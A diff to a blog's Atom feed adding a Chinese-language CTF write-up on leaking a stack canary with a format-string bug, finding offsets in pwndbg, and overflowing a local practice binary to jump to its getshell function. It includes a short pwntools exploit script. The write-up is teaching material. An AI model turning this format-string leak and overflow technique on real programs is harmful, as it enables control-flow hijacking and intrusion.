@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-11-10T13:07:43.403Z</updated>
+  <updated>2021-11-13T13:46:18.672Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>pwn-canary的gdb调试小节</title>
+    <link href="http://example.com/2021/11/13/pwn-canary%E7%9A%84gdb%E8%B0%83%E8%AF%95%E5%B0%8F%E8%8A%82(1)/"/>
+    <id>http://example.com/2021/11/13/pwn-canary%E7%9A%84gdb%E8%B0%83%E8%AF%95%E5%B0%8F%E8%8A%82(1)/</id>
+    <published>2021-11-13T12:24:08.000Z</published>
+    <updated>2021-11-13T13:46:18.672Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="canary简意"><a href="#canary简意" class="headerlink" title="canary简意"></a><strong>canary</strong>简意</h2><p>​        通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖ebp、eip等，从而达到劫持控制流的目的。然而stack canary这一技术的应用使得这种利用手段变得难以实现。</p><p>​        概念应用在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的canary值,栈帧销毁前测试该值是否“死掉”，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。</p><p>那我们看向题目:</p><p><img src="../../images/image-20211113203733085.png" alt="image-20211113203733085"></p><p>多的我不多说直接看vuln函数,点击(call vuln函数)</p><p><img src="../../images/image-20211113204134668.png" alt="image-20211113204134668"></p><p>漏洞点就那几个当时我想的思路是(程序能运行两次)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串泄漏出canary的地址+然后算出canary的偏移覆盖掉+覆盖掉ebp+/bin/sh</span><br></pre></td></tr></table></figure><p>好像是那个回事但是我找的偏移方式就是(aaaa-%p-%p-%p)但是找不到这个办法是不可靠的于是我查查其他的资料发现有其他的方式找到canary的偏移</p><p>在vuln的汇编代码中</p><p><img src="../../images/image-20211113204832991.png" alt="image-20211113204832991"></p><p>canary函数栈帧初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:080485FC                 mov     eax, large gs:14h</span><br><span class="line">.text:08048602                 mov     [ebp+var_C], eax</span><br></pre></td></tr></table></figure><p>栈上放置canary值并且在退出前验证</p><p><img src="../../images/image-20211113205853126.png" alt="image-20211113205853126"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048640                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:08048643                 xor     eax, large gs:14h</span><br></pre></td></tr></table></figure><h2 id="好开始技巧方面的了"><a href="#好开始技巧方面的了" class="headerlink" title="好开始技巧方面的了"></a>好开始技巧方面的了</h2><p>我们直接pwngdb调试(s 进入到这个函数里面)</p><p><img src="../../images/image-20211113210209032.png" alt="image-20211113210209032"></p><p>然后到下面这张图里面</p><p><img src="../../images/image-20211113210311364.png" alt="image-20211113210311364"></p><p>输入查看栈帧初始化地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print $ebp-0xc</span><br><span class="line">$1 = (void *) 0xffffcfbc#好好保存这个地址</span><br></pre></td></tr></table></figure><p>然后我们n单步过去</p><p><img src="../../images/image-20211113210521457.png" alt="image-20211113210521457"></p><p>保存好buf的地址（Oxfffcf58）</p><p>下面计算出他的基地址不包含canary的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffcfbc-0xffffcf58 =100</span><br></pre></td></tr></table></figure><p>算出的canary偏移</p><p>开始设置断点</p><p><img src="../../images/image-20211113211234271.png" alt="image-20211113211234271"></p><p>进入vuln单步到如下</p><p><img src="../../images/image-20211113211352324.png" alt="image-20211113211352324"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">print</span> $ebp-<span class="number">0xc</span></span><br><span class="line">$<span class="number">2</span> = (void *) <span class="number">0xffffcfbc</span><span class="comment">#保存好地址</span></span><br></pre></td></tr></table></figure><p>再单步到如下</p><p><img src="../../images/image-20211113211858447.png" alt="image-20211113211858447"></p><p>获取了esp的基地址（0xffffcf40）地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0xffffcfbc-0xffffcf40)/4=31#同理64位 /8</span><br></pre></td></tr></table></figure><p>得到偏移31的地址</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r= process(&#x27;./leak_canary&#x27;)</span><br><span class="line">r.recvuntil(&quot;Hello Hacker!\n&quot;)</span><br><span class="line">getshell=ELF(&#x27;leak_canary&#x27;).sym[&#x27;getshell&#x27;]</span><br><span class="line">r.sendline(&#x27;%31$p&#x27;)</span><br><span class="line">r.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">canary=int(r.recv(8), 16)</span><br><span class="line">print hex(canary)</span><br><span class="line"></span><br><span class="line">payload=&#x27;a&#x27;*100+p32(canary)+&#x27;b&#x27;*8+&#x27;c&#x27;*4+p32(getshell) </span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>我解释一下最后一个payload变量的意思</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>+p32(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">4</span>+p32(getshell)</span><br><span class="line"> 基地址+泄漏的canary+填充垃圾数据+覆盖ebp+getshell</span><br></pre></td></tr></table></figure><p>他这个垃圾数据是</p><p>你buf有0x70的空间,你基地址+canary(是4个字节)+8个字节垃圾数据等于=0x70,不然你无法溢出</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;canary简意&quot;&gt;&lt;a href=&quot;#canary简意&quot; class=&quot;headerlink&quot; title=&quot;canary简意&quot;&gt;&lt;/a&gt;&lt;strong&gt;canary&lt;/strong&gt;简意&lt;/h2&gt;&lt;p&gt;​        通常栈溢出的利用方式是通过溢出存在于栈上</summary>
+      
+    
+    
+    
+    
+    <category term="pwn-canary" scheme="http://example.com/tags/pwn-canary/"/>
+    
+  </entry>
   
   <entry>
     <title>v4.6.0-gdb.attach问题</title>
